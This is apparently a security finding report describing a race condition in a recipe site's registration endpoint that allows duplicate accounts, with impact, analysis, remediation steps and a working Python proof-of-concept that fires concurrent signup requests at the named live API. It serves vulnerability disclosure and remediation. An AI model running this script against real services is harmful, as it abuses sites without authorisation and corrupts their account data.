# Race Condition in Registration Allows Duplicate Accounts

**ID:** vuln-0003
**Severity:** LOW
**Found:** 2026-07-14 08:34:50 UTC
**Target:** https://api.axross-recipe.com/signup
**Endpoint:** /signup
**Method:** POST
**CWE:** CWE-362
**CVSS:** 3.7

## Description

The registration endpoint is vulnerable to race conditions. When multiple concurrent requests are sent with the same username and email, the server processes them simultaneously before the uniqueness check completes, resulting in duplicate accounts being created with identical credentials.

## Impact

Multiple user accounts can be created with the same username and email address. This violates data integrity constraints and can lead to account confusion, where actions performed under one account may be attributed to another. In combination with the CSRF vulnerability, this could be exploited for more sophisticated attacks.

## Technical Analysis

The registration endpoint performs a check-then-act pattern: it first checks if the username/email already exists, then inserts the new record. These two operations are not atomic. When concurrent requests arrive, both can pass the existence check before either insert completes, resulting in duplicate records. The server also returns HTTP 500 errors for some of the concurrent requests, indicating that the race condition causes unhandled exceptions in the application code.

## Proof of Concept

1. Obtain a valid nonce from /signup/nonce
2. Prepare 3 identical registration requests with the same username and email
3. Send all 3 requests simultaneously using HTTP/2 multiplexing or async connections
4. Observe that 2 out of 3 requests return {"result":"success"}
5. Both accounts now exist with the same username and email

The race window exists because the uniqueness check (SELECT) and the INSERT operation are not atomic.

```
#!/usr/bin/env python3
"""Race Condition PoC for Axross Recipe Registration"""
import asyncio
import aiohttp
import time

TARGET = "https://api.axross-recipe.com"

async def get_nonce(session):
    async with session.get(f"{TARGET}/signup/nonce") as resp:
        return await resp.text()

async def register(session, username, email, nonce, idx):
    payload = {
        "username": username,
        "email": email,
        "password": "TestPass123!",
        "password_confirmation": "TestPass123!",
        "nonce": nonce,
        "agreed_to_terms": True
    }
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://axross-recipe.com"
    }
    async with session.post(f"{TARGET}/signup", json=payload, headers=headers) as resp:
        body = await resp.text()
        return idx, resp.status, body

async def main():
    ts = int(time.time())
    username = f"racetest{ts}"
    email = f"racetest{ts}@example.com"
    
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        nonce = await get_nonce(session)
        print(f"Nonce: {nonce}")
        
        tasks = [register(session, username, email, nonce, i) for i in range(3)]
        results = await asyncio.gather(*tasks)
        
        successes = [r for r in results if r[1] == 200 and '"result":"success"' in r[2]]
        print(f"Total: {len(results)}, Successes: {len(successes)}")
        for r in results:
            print(f"  Request {r[0]}: status={r[1]}, body={r[2][:100]}")
        
        if len(successes) > 1:
            print(f"RACE CONDITION CONFIRMED: {len(successes)} duplicate accounts!")

asyncio.run(main())
```

## Remediation

1. Add a database-level unique constraint on the username and email columns.
2. Use an atomic upsert operation instead of separate check-then-insert logic.
3. Implement row-level locking or advisory locks during registration.
4. Use a database transaction with SERIALIZABLE isolation level for the registration flow.
5. Consider using a queue or rate limiter to serialize registration requests for the same username/email.
